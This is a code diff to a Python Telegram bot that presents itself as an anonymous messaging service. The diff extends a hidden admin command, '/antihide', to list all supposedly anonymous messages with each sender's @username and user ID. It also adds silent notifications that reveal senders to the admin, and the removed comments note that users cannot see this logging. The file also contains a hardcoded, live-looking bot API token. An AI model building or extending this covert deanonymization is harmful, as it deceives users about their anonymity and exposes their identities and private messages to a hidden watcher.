@@ -14,7 +14,6 @@ from aiogram.client.bot import DefaultBotProperties
 API_TOKEN = '8413380142:AAGqbQxT3dMyQFApJLLSWrpewVoX_nudjOc'
 ADMIN_ID = 6938587500
 
-# Настройка логирования (только для админа, пользователи не видят)
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
@@ -25,7 +24,6 @@ dp = Dispatcher()
 DB_FILE = 'anonymous_bot.db'
 
 def init_db():
-    """Инициализация базы данных"""
     conn = sqlite3.connect(DB_FILE, check_same_thread=False)
     cursor = conn.cursor()
     
@@ -57,6 +55,7 @@ def init_db():
             from_user_id INTEGER,
             from_name TEXT,
             from_username TEXT,
+            from_tag TEXT,
             to_user_id INTEGER,
             to_name TEXT,
             to_username TEXT,
@@ -110,7 +109,6 @@ async def start(message: Message):
     username = message.from_user.username
     full_name = message.from_user.full_name
 
-    # Проверяем переход по ссылке
     args = message.text.split()
     if len(args) > 1:
         secret_key = args[1]
@@ -133,7 +131,6 @@ async def start(message: Message):
             await message.answer("❌ Неверная или устаревшая ссылка!")
             return
 
-    # Обновляем информацию о пользователе
     cursor.execute('''
         UPDATE users 
         SET username = ?, full_name = ? 
@@ -216,30 +213,38 @@ async def show_stats(message: Message):
 
 @dp.message(Command('antihide'))
 async def antihide(message: Message):
-    """Скрытая команда для админа"""
+    """Скрытая команда для админа — показывает ВСЕ сообщения с тегом и ID"""
     if message.from_user.id != ADMIN_ID:
-        return  # Просто игнорируем, не отвечаем
+        return
     
     cursor.execute('''
-        SELECT from_name, from_username, to_name, to_username, message_text, timestamp
+        SELECT from_tag, from_user_id, to_name, message_text, timestamp
         FROM admin_logs 
         ORDER BY id DESC 
         LIMIT 50
     ''')
-    all_messages = cursor.fetchall()
-
-    if not all_messages:
+    logs = cursor.fetchall()
+    
+    if not logs:
         await message.answer("📭 Нет сообщений.")
         return
-
-    for msg in all_messages:
+    
+    for row in logs:
+        from_tag, from_id, to_name, msg_text, ts = row
+        
+        # Форматируем отправителя: если есть тег, показываем @tag (ID), иначе просто ID
+        if from_tag and from_tag != 'None' and from_tag != '':
+            sender_display = f"{from_tag} ({from_id})"
+        else:
+            sender_display = str(from_id)
+        
         text = (
-            f"📨 *{msg[0]}* → *{msg[2]}*\n"
-            f"💬 {msg[4]}\n"
-            f"🕐 {msg[5]}\n"
+            f"📨 {sender_display} → {to_name}\n"
+            f"💬 {msg_text}\n"
+            f"🕐 {ts}\n"
             f"─" * 20
         )
-        await message.answer(text, parse_mode="Markdown")
+        await message.answer(text)
 
 @dp.message(Command('test'))
 async def test(message: Message):
@@ -301,6 +306,9 @@ async def handle_anonymous_message(message: Message):
             to_name = to_user[0]
             to_username = to_user[1]
             
+            # Формируем тег отправителя для админских логов
+            from_tag = f"@{from_username}" if from_username else str(from_user_id)
+            
             reply_token = generate_reply_token()
             
             cursor.execute('''
@@ -310,11 +318,16 @@ async def handle_anonymous_message(message: Message):
             
             msg_id = cursor.lastrowid
             
-            # Сохраняем в лог для админа (скрыто)
             cursor.execute('''
-                INSERT INTO admin_logs (from_user_id, from_name, from_username, to_user_id, to_name, to_username, message_text, timestamp)
-                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
-            ''', (from_user_id, from_name, from_username, to_user_id, to_name, to_username, message.text, datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
+                INSERT INTO admin_logs (
+                    from_user_id, from_name, from_username, from_tag,
+                    to_user_id, to_name, to_username, message_text, timestamp
+                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
+            ''', (
+                from_user_id, from_name, from_username, from_tag,
+                to_user_id, to_name, to_username, message.text,
+                datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            ))
             conn.commit()
             
             reply_markup = InlineKeyboardMarkup(inline_keyboard=[
@@ -337,19 +350,18 @@ async def handle_anonymous_message(message: Message):
                         parse_mode="Markdown"
                     )
             except Exception as e:
-                logger.error(f"Ошибка: {e}")
+                logger.error(f"Ошибка отправки: {e}")
             
             cursor.execute('DELETE FROM temp_context WHERE user_id = ?', (from_user_id,))
             conn.commit()
             
             await message.answer("✅ Отправлено!")
             
-            # Тихое уведомление админу (пользователи не видят)
+            # Тихое уведомление админу
             reply_info = " (ответ)" if reply_to_msg_id else ""
             await bot.send_message(
                 ADMIN_ID,
-                f"📨 Новое сообщение{reply_info}\nОт: {from_name}\nКому: {to_name}\nТекст: {message.text}",
-                parse_mode="Markdown"
+                f"📨 Новое сообщение{reply_info}\nОт: {from_name} (@{from_username if from_username else 'нет'})\nКому: {to_name}\nТекст: {message.text}"
             )
         else:
             await message.answer("❌ Ошибка.")
@@ -358,6 +370,8 @@ async def handle_anonymous_message(message: Message):
 
 async def main():
     print("🤖 Бот запущен")
+    print(f"👤 Админ ID: {ADMIN_ID}")
+    print("📝 /antihide — показать все сообщения (с тегом и ID отправителя)")
     await dp.start_polling(bot)
 
 if __name__ == '__main__':
